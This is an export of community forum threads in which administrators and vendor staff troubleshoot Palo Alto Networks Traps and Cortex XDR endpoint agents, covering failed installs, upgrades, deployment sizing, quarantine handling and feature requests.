95,278583,SoporteITS,"Hi,I have seen that in some cases, the Traps installation is not correct. In those cases, the cleaner does not work and the solution is to execute it in safe mode.I have seen that if traps is stopped with the cytool, the you can execute the cleaner correctly. For those Endpoints that you can not access in safe mode because of different issues, you can try this.Regards.",0,05-13-2020,08:31 AM
96,325934,dfalcon,Hi@Abdul_Razaq-This feature is not in the product yet. I checked the feature request list and it has already been requested. I will upvote the request.,0,05-06-2020,07:00 PM
97,326289,dfalcon,Hi@JacobHusted-I'm not sure what you're looking for. Are you looking for the recommended agent version?,0,05-06-2020,07:54 AM
98,325955,dfalcon,"Hi @Marsooq-Akkaradathil-To scan a group of endpoints, you can either check the desired endpoints in your endpoint list, then right-click > Security Operations > Initiate Malware Scan.You could also create a group under Endpoints > Endpoint Management > Endpoint Groups then do the same steps above, but selecting the group instead of manually clicking. This allows you to re-use the group in the future.The reporting side is not as easy. For this, you will want to go to Reporting > Reports Templates and build out the report you want with a custom date range matching the time frame where you ran the scan. Unfortonuately, the report will also include other alerts that were discovered during this time frame that may have come from outside of the scan.",0,05-04-2020,07:54 AM
99,191249,heueri88,We are facing the same problem. Did you ever resolve it?,0,04-14-2020,09:57 PM
100,191249,dfalcon,Hi there. The process for VDI has changed a little over the years. Let's start with the platform question. Are you using ESM or Cortex?,0,04-15-2020,07:24 AM
101,191249,heueri88,"Hi, we are using TSM.",0,04-15-2020,10:39 PM
102,191249,dfalcon,Hi there. Can you let me know what version of ESM you're on? Is it 4.2? Also is the VDI persistent or non-persistent?,0,04-16-2020,08:03 AM
103,191249,heueri88,"Hey, maybe we misunderstand. We are using TSM, Traps Management Service / Cortex. And we are using non-persistent VDIs with Citrix Xendesktop 7.15.",0,04-16-2020,10:00 PM
104,191249,dfalcon,"Got it - that helps.A few things to verify. First, does the installation package still exist in your tenant? Second, from one of the affected machines, can you launch the agent console click check-in now -- then wait about 15 second and click Open Log File? I would like to see the log entries at the time you click check-in now for any error / denial messages.",0,04-21-2020,10:55 AM
105,191249,heueri88,We have now opened a case with Palo Alto. So I think we do not need to follow up this here anymore.,0,04-21-2020,11:30 PM
106,310714,dfalcon,"HI there-So are the agents upgrading, but failing to start? If so, there may have been an issue with the upgrade where remnants were not properly removed. If you are still having this issue, I would start troubleshooting by contacting support and acquiring the cleaner tool. This will allow all remnants of the agent to be removed prior to installing the new version. If we can isolate the cause/solution, we can then help with a move-forward plan.",0,04-02-2020,08:00 AM
107,310714,MeteoAdmin,"Yes, agent updated but failing to start. We tryed also with thecleaner tool but with the same result.We order Traps from our dealer. It's a business partner from Paloalto. And therefore we can't open a support case directly by Paloalto.Our Traps Management Service will be upgraded to Cortex XDR 2.0 soon. Agents and full configurations will be upgraded automatically, no manual action is required.I'll see what happens.",0,04-03-2020,06:00 AM
108,310714,dfalcon,Hi @MeteoAdminOne other item I would like to check. Can you confirm that no products on this list are also running on the endpoints?https://docs.paloaltonetworks.com/compatibility-matrix/cortex-xdr/cortex-xdr-compatibility-with-thir...,0,04-06-2020,08:24 AM
109,310714,Meteo-Admin,"Yes, I can confim. Noproductsfrom this list is running on the endpoints.Last weekend our Traps Management Service would be upgraded to Cortex XDR 2.0. All looks well. I'll try to upgrade the agent of my working laptop by remote (6.0.3 to 7.0.2.42857). Unfortunately unsuccessful with the same known problem. After upgrade service did not start. I must delete all files from filesystem and clean the registry. Then a new installation of the agent was successful.",0,04-07-2020,05:23 AM
110,310714,ancis,"Who ever you purchased the software from, can open a case with Palo alto support. You should collect a tech support file from a few of the failed machines, and contact the vendor you work with. if you have the cleaner tool, it purges all of the files from the system, and uploads everything on the next reboot. The cleaner tool is version specific. Your vendor should be able to provide to you via Palo alto support.",1,04-07-2020,05:45 AM
111,310714,Meteo-Admin,Efrancisyou're right. But in the past our vendoralways wanted money for his support. In the meantime i could update the most of our clients to the new version 7.0.2.42857.,0,04-17-2020,04:21 AM
112,310808,dfalcon,"Hi there,To my knowledge, there is no best practice documentation out there that covers this. If it were me, I would leverage the report only mode for a few days on machines that are in active use. There are three main areas where I would focus. Malware, BTP, and Exploit. Malware is black and white - this gives you a chance for WIldFire and Local Analysis to make verdicts without doing prevention. Exploit, on the other hand is not so black and white; however, it is not as complicated as it was in the past. Out of the box, the product injects into commonly exploited processes and looks for different techniques. For the most part, these are tuned. If you elect to protect additional processes, reporting mode is important to see if you need to do any tuning. BTP is looking at causality chains -- or sequences of events -- to determine if a sequence of events is bad. Same goes here - I would leverage report mode for a few days to verify these scenarios.All that being said, putting machines is report mode can show you what would have been prevented to allow you to tune prior to cutting over to block. If the machines are actively being used, I would leave them in report mode for only a few days.",0,04-02-2020,07:54 AM
113,310808,CraigV123,This is great advice and I appreciate the response. I think this is sorta what we were gearing towards but I greatly appreciate the clarification on it.,0,04-16-2020,04:23 AM
114,301065,AriKukkonen,"Error downloading from https://traps-prodng-installers-origin-70.s3.eu-central-1.amazonaws.com*SNIPPED*=host to file Traps.pkg, error code -10Failed invoking callback with error -10Error downloading upgrade package, error code -10Error executing upgrade action with error code -10Agent action with ID c3ea4e7c2bd7dac7ed90746cf1fe4bc1 execution failed with -10",0,11-27-2019,07:08 AM
115,301065,AriKukkonen,"solved, had to addhttps://traps-prodng-installers-origin-70.s3.eu-central-1.amazonaws.com as url which should not be decrypted.",2,11-27-2019,07:25 AM
116,301065,NeilDavidson,Exact same problem and workaround. Good to know it wasn't just us!,1,12-04-2019,06:21 AM
117,301065,SimonTan,where to add the url?,0,04-09-2020,10:24 AM
118,321421,dfalcon,"You're going to need to run the installer again with verbose logging enabled to identify the issue. For your install run the following:msiexec.exe /i PackageName.msi /L*V Console426.log (replace PackageName with the name of your msi)The output of this statement will be a log file named Console426.log in the msi directory. (You can change the location of the log file by putting a different path). Anyway, after it fails, search for the error in the log. If you need additional help, you can post the error here and I will review.",0,04-08-2020,12:09 AM
119,321421,RichardP11,"Here's the errors:StartIIS7ConfigTransaction: Entering StartIIS7ConfigTransaction in C:\Windows\Installer\MSI70C1.tmp, version 3.11.1701.0MSI (s) (48:40) [12:42:04:232]: Executing op: ActionStart(Name=RollbackIIS7ConfigTransaction,Description=Rolling back IIS Config Transaction,)Action 12:42:04: RollbackIIS7ConfigTransaction. Rolling back IIS Config TransactionMSI (s) (48:40) [12:42:04:232]: Executing op: CustomActionSchedule(Action=RollbackIIS7ConfigTransaction,ActionType=11521,Source=BinaryData,Target=Password,CustomActionData=Password)MSI (s) (48:40) [12:42:04:232]: Executing op: ActionStart(Name=CommitIIS7ConfigTransaction,Description=Committing IIS Config Transaction,)Action 12:42:04: CommitIIS7ConfigTransaction. Committing IIS Config TransactionMSI (s) (48:40) [12:42:04:232]: Executing op: CustomActionSchedule(Action=CommitIIS7ConfigTransaction,ActionType=11777,Source=BinaryData,Target=Password,CustomActionData=Password)MSI (s) (48:40) [12:42:04:232]: Executing op: ActionStart(Name=ConfigureIIs7Exec,Description=Configuring IIS,)Action 12:42:04: ConfigureIIs7Exec. Configuring IISMSI (s) (48:40) [12:42:04:232]: Executing op: CustomActionSchedule(Action=ConfigureIIs7Exec,ActionType=11265,Source=BinaryData,Target=Password,CustomActionData=Password)MSI (s) (48:90) [12:42:04:232]: Invoking remote custom action. DLL: C:\Windows\Installer\MSI719D.tmp, Entrypoint: ConfigureIIs7ExecConfigureIIs7Exec: Entering ConfigureIIs7Exec in C:\Windows\Installer\MSI719D.tmp, version 3.11.1701.0ConfigureIIs7Exec: Skipping ScaMimeMapRead() - required table not presentConfigureIIs7Exec: Skipping ScaHttpHeaderRead() - required tables not present.ConfigureIIs7Exec: Skipping ScaWebErrorRead() - required tables not present.ConfigureIIs7Exec: Entering ScaWebsRead7()ConfigureIIs7Exec: Exiting ScaWebsRead7()ConfigureIIs7Exec: Skipping ScaInstallWebDirs7() because IIsWebDir table not presentConfigureIIs7Exec: Could not find Web: DefaultWebSite, defaulting to Default Web SiteConfigureIIs7Exec: Skipping ScaFiltersRead() - no IIsFilter tableConfigureIIs7Exec: Skipping ScaInstallProperty() - required table not presentConfigureIIs7Exec: Skipping ScaWebSvcExtCommit() because there are no web service extensions in the listConfigureIIs7Exec: Custom action data hash: A1520A0D1554B4BE3B0E92BD70C1EF13CD61A88CMSI (s) (48:40) [12:42:04:404]: Executing op: ActionStart(Name=WriteIIS7ConfigChanges,Description=Installing Config Keys and Values,)Action 12:42:04: WriteIIS7ConfigChanges. Installing Config Keys and ValuesMSI (s) (48:40) [12:42:04:404]: Executing op: CustomActionSchedule(Action=WriteIIS7ConfigChanges,ActionType=11265,Source=BinaryData,Target=Password,CustomActionData=Password)MSI (s) (48:80) [12:42:04:419]: Invoking remote custom action. DLL: C:\Windows\Installer\MSI724A.tmp, Entrypoint: WriteIIS7ConfigChangesWriteIIS7ConfigChanges: Entering WriteIIS7ConfigChanges in C:\Windows\Installer\MSI724A.tmp, version 3.11.1701.0WriteIIS7ConfigChanges: Custom action data hash: A1520A0D1554B4BE3B0E92BD70C1EF13CD61A88CWriteIIS7ConfigChanges: CustomActionData WriteIIS7ConfigChanges length: 64WriteIIS7ConfigChanges: Error 0x8007045a: Failed to open AppHostWritableAdminManager to configure IIS7WriteIIS7ConfigChanges: Error 0x8007045a: WriteIIS7ConfigChanges Failed.CustomAction WriteIIS7ConfigChanges returned actual error code 1603 (note this may not be 100% accurate if translation happened inside sandbox)Action ended 12:42:04: InstallFinalize. Return value 3.--------------------------------MSI (c) (90:A8) [12:42:20:060]: Product: Endpoint Security Manager Console 4.2.6.41522 -- Installation failed.MSI (c) (90:A8) [12:42:20:060]: Windows Installer installed the product. Product Name: Endpoint Security Manager Console 4.2.6.41522. Product Version: 4.2.6.41522. Product Language: 1033. Manufacturer: Palo Alto COMworks, Inc.. Installation success or error status: 1603.MSI (c) (90:A8) [12:42:20:060]: Grabbed execution mutex.MSI (c) (90:A8) [12:42:20:060]: Cleaning up uninstalled install packages, if any existMSI (c) (90:A8) [12:42:20:075]: MainEngiCOMhread is returning 1603=== Verbose logging stopped: 07-04-2020 12:42:20 ===Thank you for your help",0,04-08-2020,12:53 AM
120,321421,dfalcon,What are the log entries prior to the rollback action?,0,04-08-2020,07:27 AM
121,311390,dfalcon,"I see that you are logged in as root. As long as the Linux server distro is in the supported list, you've checked the boxes. You should contact Support at https://support.paloaltonetworks.com or if in the US you can contact via phone at 866.898.9087 so we can troubleshoot deeper.",0,04-02-2020,07:23 AM
122,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
123,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
124,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
125,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
126,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
127,320026,dfalcon,"Hi there-BTP should not be triggering on the smss process alone. BTP is looking at sequences of events and based on the behavior of the entire sequence, it can trigger an alert. After reviewing the Analysis tab in TMS that shows all of the events that triggered the alert, if you determine that this is s FP, you should indeed create exclusion for this scenario.",0,04-02-2020,07:14 AM
128,303783,Srikanth.Singiraria-labeleddy,Think the only way is to identify the path and delete them manually or use some scripts.As far as I am aware traps does not scan or delete files automatically. It will only stop the execution of exploits and malicious files.,0,12-15-2019,04:32 PM
129,303783,Sistemas_SanLucaria-labelar,It's the same for us.We use Traps with another Sophos Endpoint antivirus. The problem is that Sophos detects the files in the trap quarantine and we want to delete them manually and we can't.We've tried it:-Connect to the remote Traps console and perform a deletion of the /f pathfile. I thought that the Traps console already had enough permissions to delete their files. (bummer!)-I tried to run from the same console a /User rune:... but it asks me for the password and I can't type it.-I tried to connect through Windows Explorer with a domain user who is a member of the machine's administrator. I see the file but it won't let me delete it.What permissions and what do I have to do to delete it?Can someone share the way to do it?Palo Alto could take note of improving the product. He can be very good at detecting viruses but if he doesn't improve the console and management tools we don't do anything.Regards,0,01-23-2020,01:21 AM
130,303783,CraigV123,Not sure if this is updated or not or if a resolution has been provided. You can configure quarantine settings in the Malware profile on the TMS. I believe it's disabled by default.This article speaks to this better than I can. Hope it helps.https://docs.paloaltonetworks.com/traps/tms/traps-management-service-admin/assess-and-remediate-secu...,0,02-18-2020,12:32 PM
131,303783,Sistemas_SanLucaria-labelar,"Hi,Thank you for your answer. But it does not indicate how to remove a malicious element that is in the quarantine.I don't understand why there's no option in the console to tell the agent to delete it.I still think the console has a long way to go to catch up with other similar products.Regards",1,02-20-2020,12:26 AM
132,303783,dfalcon,"Hi there- if you can send me a private message with your contact info, I can log a feature request for this function.",1,03-31-2020,07:56 PM
133,303783,Sistemas_SanLucaria-labelar,"Hi,I tried to send you a private message but it showed:You do not have sufficient privileges for this resource or its parent to perform this action.Click your browser'sBackbutton to continue.",0,04-01-2020,07:47 AM
134,297261,Calvin.Mcelroy,"I have been searching for an answer to this same question for quite some time. From what I can tell, and please correct me if I am wrong, there is not a publicly available Traps API, at least not yet anyway. However, there are robust public APIs for WildFire, Cortex XDR, and Demisto that utilize Traps as a key component of their functionality. These other APIs provide ways of interacting with Traps that could probably solve some of the use cases a Traps API would provide.From my understanding, with the release of Traps 6, Traps TMS is about to get a face lift that has a strong resemblance to the interface of Cortex XDR. For all intents and purposes, Traps is actually a subcomponent to Cortex XDR, and you cannot own XDR without also deploying traps on your end points. Because of this dependency we will see some functionality added to Traps in the coming months that will be critical to the functionality of Cortex XDR, specifically the BIOCs and possibly USB management.That all sounds fantastic, but what does that mean for the Traps API? Well Traps uses Cortex Data Lake to store all event and incident data to allow integration with Cortex XDR and probably other Palo Alto products. All of these APIs seem to be using Data Lake in some way. This may suggest at some point in time that there was a fundamental shift in Palo Alto's integration strategy between the PAN-OS API and Cortex XDR to use this Data Lake as the key to all of the APIs and to keep it obscure as possible from public view. If there was a Data Lake API a user could potentially do the ""Stitching"" on their own. In my opinion, before this shift in integration strategy, there was a private Traps API, and probably is still being used by Traps under the hood. This may be pretty far into the realm of speculation, but if anybody has additional supporting or contradicting details, I would really like to know more about the reason why there is not a public Traps API.https://www.paloaltonetworks.nl/apps/pan/public/downloadResource?pagePath=/content/pan/en_US/resourc...",0,12-16-2019,10:14 PM
135,297261,ancis,https://docs.paloaltonetworks.com/cortex/cortex-xdr/cortex-xdr-api/cortex-xdr-apis,0,12-17-2019,05:47 AM
136,297261,Calvin.Mcelroy,Can you use this with out XDR?,0,12-17-2019,09:26 AM
137,297261,dfalcon,Cortex XDR is required; however everyone has either been or will be migrated very soon.,0,03-31-2020,08:08 PM
138,297261,Calvin.Mcelroy,You are correct. I am excited to see what we can do with the Cortex API.,0,04-01-2020,06:42 AM
139,315284,dfalcon,Hi there-There is no way to push a proxy configuration with the upgrade package. Where are you located? I can try to have a Cortex Systems Engineer reach out to you for assistance. This may require a little thought.,0,03-31-2020,07:38 PM
140,315284,0xdeadbeef,"Hi David,thanks for the information. That is quite unfortunate. We are located in EMEA / Germany, but currently there is no need to get in touch with a Cortex Systems Engineer as we ourselves got a contact to help us with the migration. But due to the current situation (COVID-19, etc.) the project gets postponed.Best regards~ Archie",0,03-31-2020,11:18 PM
141,305521,dfalcon,"Hi there-You are correct, this feature does not exist. I will say that in Cortex XDR 2.0, it is easier to build static lists. You can use filters to be very selective of the group membership. You can also ""check"" the machines that you want to add to the group. If these methods do not help, please send me a message with your contact details and I will log a feature request.",0,03-31-2020,08:07 PM
142,306250,dfalcon,"Hi there. Yes, this is correct; the upgrade started and should be complete very soon.",0,03-31-2020,08:00 PM
143,309110,dfalcon,"Does the agent installation still exist in the tenant? If it is deleted, no agents will activate with that MSI.",0,03-31-2020,07:58 PM
144,311546,BPry,"@Timmy24,I can't speak to performance on any Oracle host; but we haven't run into any issues without any exceptions on Exchange 2010/2016 environments or SQL Server 2016/2019 installations.",2,02-17-2020,09:57 AM
145,311546,CraigV123,"Similar to BPry we haven't had any issues in our environment with Exchange, SQL, or other sensitive servers and currently do not have any exclusions related to them. I would recommend building out a ""report only"" policy and see what Wildfire might catch as a first step. After you're comfortable with it you can adjust the profiles to whatever you need. We're quite happy to have moved to Traps. Considerably less administrative overhead.",2,02-18-2020,12:14 PM
146,311546,Timmy24,thank you for the replies. We have installed this on one of our Exchange servers and SQL servers as is with no issues so far!Thank you!,1,02-25-2020,04:39 AM
147,311546,dfalcon,"Glad to hear. As CraigV123mentioned, it is a good idea to test in a learning mode by setting the action to Report before setting the action to Block.",0,03-31-2020,07:48 PM
148,312173,batd2,@Sistemas_SanLucarThere is no webpage as such. I think that the normal process is to raise it with your assigned by Palo Alte SE and they will submit a feature request.,0,02-20-2020,04:41 AM
149,312173,KRISHNAN_Shrisuaria-labelndar,You can export all the endpoints to csv in a single click . You may have permission issues. Please check the admin privileges.,1,03-02-2020,08:28 PM
150,312173,dfalcon,"What version of the product are you using. I can reply with the steps to accomplish this.Second, if there is a feature that is missing, I'm happy to log a feature request.",0,03-31-2020,07:45 PM
151,311120,David_Browning,I have that also and I think it has to do with Traps not being able to check-in with the device right away. It seems to have a problem with that as in not moving on to the next one and coming back to it. It would be nice if there was a way to cancel jobs that are hanging instead of just having to wait for it to fail.,0,03-06-2020,07:49 AM
152,311120,dfalcon,"All environments have either been or will soon be upgraded to Cortex 2.0. If you experience the same challenge after your upgrade, please reply and I will log a feature request. No other feature requests are being accepted for TMS.",0,03-31-2020,07:41 PM
153,312143,dnd4ever,We are as well? Any other solution?,0,03-04-2020,12:29 PM
154,312143,S_Rashid,"HiDnd4ever,There was a general issue with US cloud based wildfire, so I configured the ESM to communicate with EU cloud based wildfire. below is the url:https://eu.wildfire.paloaltonetworks.com",0,03-09-2020,10:41 PM
155,312143,dfalcon,"You can check the status of WildFire (as well as other Palo Alto Networks services) by region here:https://status.paloaltonetworks.com/If you see no report issues, you should log an incident with Support.",0,03-31-2020,07:28 PM
156,316104,dfalcon,Curious - what version of the product are you running?,0,03-31-2020,07:19 PM
157,319587,dfalcon,"The upload file button will upload to the connected machine. Depending on the configuration of your malware profile, files unknown to WildFire are automatically uploaded to WildFire.If you would like to check on whether a specific file is known to WF, there are different methods depending on the version you are on. A manual way is to search athttps://wildfire.paloaltonetworks.com/wildfire/dashboard.If you reply with your version, I can provide you the steps to check from your tenant.",0,03-31-2020,07:10 PM
158,294880,gstjohn,"Try ""timeout 4 upload 5"" and it won't wait an hour to complete, it will wait 5 minutes. See documentation for more info about those options",1,03-02-2020,12:49 PM
159,294880,ATB-Adm,"Thanks, that was the issue!I thought about to change the timeout, but I wasn't sure if it would be a problem later on.Now it takes just about 12 minutes to complete the scan.",0,03-11-2020,02:07 AM
160,311508,christoph_oppelaria-labelt,"Well, so i kind of fixed it by manually installing the intermediate certificate on the client.Just gotta check now, why the server is not giving out the intermediate certificate.",1,03-04-2020,02:51 AM
161,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
162,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
163,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
164,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
165,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
166,314119,Sailesh_Aryal,I had put on a support request when the Surface X was released. They told me its not compatible. Might have changed now. Check with support.,1,03-03-2020,07:59 AM
167,311706,CraigV123,Maybe a way with the upcoming Cortex XDR 2.0 upgrade? Not sure in the current TMS though. Would be a handy feature though.,0,02-18-2020,12:18 PM
168,309560,ancis,"@ADVENS_SIis the local admin account used to start up the services (ESM services)? if so, those services need to updated with the new password. Also, if that account is used by the database, it will need to be updated. If you contact Palo Alto networks support, they should be able to walk you through the process of changing the password, and what areas on the system to check if you are not sure how the admin account is leveraged.",1,02-05-2020,06:23 AM
169,309560,ADVENS_SI,"Hi !Thank you for your quick reply 😉Yes, the traps local admin account start the ""Endpoint Security Manager"" service.But i think that i have another account for the DB connection (the acount which start the SQL express DB is not the same as ESM)I'll open a case at support.",0,02-05-2020,06:30 AM
170,309560,ADVENS_SI,HiSupport help me to reset password.Everything is ok.Thank you,0,02-13-2020,12:47 AM
171,307971,BPry,"Absolutely, using the AD Sync feature just makes creating profiles and groups a little easier. Traps works perfectly fine without any of that setup though.",2,01-25-2020,08:47 AM
172,307575,WOghumu,"Hi,Create the registry keyHKLM\SOFTWARE\Microsoft\Windows Defender\PassiveModeREG_DWORD 0x2(2)",0,01-22-2020,07:12 AM
173,307575,S_Rashid,"Hi,The registry is already configured by default like you mentioned, but still the real time protection option is disable.",0,01-22-2020,09:36 PM
174,306846,BPry,"@SpencerShiley,Directly, no it doesn't. Once the system is patched Microsoft has included a function to see if an exploit attempt is being made, but you need the patch to get that log entry.The good news is that, so far, all of the PoC is relying on other exploits to gain access to the system system to drop everything, which Traps should detect and defend against.",1,01-15-2020,11:27 AM
175,306846,BPry,"@SpencerShiley,Hopefully everyone has fully patched their environments by now, but if for some reason you can't yet PAN actually updated Traps to include CVE-2020-0601 exploitation detection with the release of Traps agent6.1.4-h1.",1,01-21-2020,01:49 PM
176,302272,AriKukkonen,I did all the possible exceptions for process dropbox.exe. Problem still stays. I noticed in trapsd.log that Traps ignores my exceptions. Why?<Info> ignoring admin exception for process: 'dropbox.exe',0,12-06-2019,12:15 PM
177,302272,AriKukkonen,"After a few days of testing different combinations, I now know it is the Anti-Ransomware Module which causes the problem. But creating exception for dropbox.exe, dbxsvc.exe, QtWebEngineProcess.exe does not help. Just disabling whole module.",0,12-09-2019,08:12 AM
178,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
179,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
180,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
181,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
182,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
183,295455,BPry,"@jsrp123,6.0.1 is effected by a high CPU utilization bug that was addressed in 6.0.2 due to RPC traffic that could be causing you issues. I'd recommend you test upgrading your machine to at least 6.0.2 if not 6.0.3 and see if that at least fixes your CPU increase if not the actual SfB issue.",0,10-31-2019,02:51 PM
184,250701,ancis,"NasrulKamal,Can you please describe your issue with greater detail?",0,02-22-2019,05:14 AM
185,250701,NasrulKamal,"Hi,I tried install TRAPS v5.0.3 on Win server 2008R2, and it vwas ended the the error ""installation ended prematuredly"".",0,02-27-2019,07:21 PM
186,250701,ancis,"@NasrulKamalI would recommend to collect the installation logs, and open a support case with Palo Alto Networks Endpoint support.",0,03-04-2019,05:44 AM
187,250701,Rahul001,"Update .Net framework then check,Please comment or like if this hepled you out.",0,04-30-2019,02:24 AM
188,250701,Sharief,"Its either .NET framework not updated or the service account is not local admin and can't start the service.Regards,Sharief",0,10-30-2019,08:05 AM
189,295116,BatD,"@RichardP11If you think it is a false positivie, you can try requesting verdict change here:https://live.paloaltonetworks.com/t5/VirusTotal/bd-p/VirusTotal_Discussions",0,10-30-2019,01:43 AM
190,294004,MarcinSt,"Hi.I raised a support ticket and asked about Catalina support. The answer was: soon, most probably in a few next weeks 😞Regards.",1,10-24-2019,12:49 AM
191,218197,ElasticSkyX,"Hi,I would check if the Machine UUID on the endpoint is unique or being changed at each restart. This would/could cause a new Agent Unique ID to be created each time the EndPoint starts.Assuming the Endpoint is a Windows machine you can do the following from a PowerShell window:Note down the UUID and then restart the Endpoint. Repeat the above command and see if the machine UUID has changed.Kind regards.",0,06-24-2018,07:06 PM
192,218197,JacobHusted,HiI have now tested 3 time andit's the same UUID,0,06-24-2018,10:17 PM
193,218197,ElasticSkyX,"Hi there,Can you remove the delete the EndPoint entry from EMS and then re-register.Note the Agent Unique ID both the console andin the registry of the client. See if you get a duplicate entry again after restart and then reconfirm the information again:Kind regards.",1,06-24-2018,10:51 PM
194,218197,JacobHusted,"HiIt's on the TSM console, not ESM.Yes I can remove it in the TSM, but I have to reinstall the Traps client, the Traps client will not reconnect to the TSM",0,06-24-2018,10:55 PM
